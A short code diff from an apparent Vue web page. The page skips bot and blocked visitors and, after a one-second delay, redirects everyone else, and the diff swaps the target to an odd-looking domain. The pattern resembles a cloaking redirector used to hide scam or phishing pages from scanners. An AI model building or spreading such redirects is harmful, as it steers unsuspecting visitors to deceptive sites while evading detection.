@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://ovt.spembroke.com/';
+          window.location.href = 'https://sc.1tressboint.mom/';
         }, 1000);
       }
 
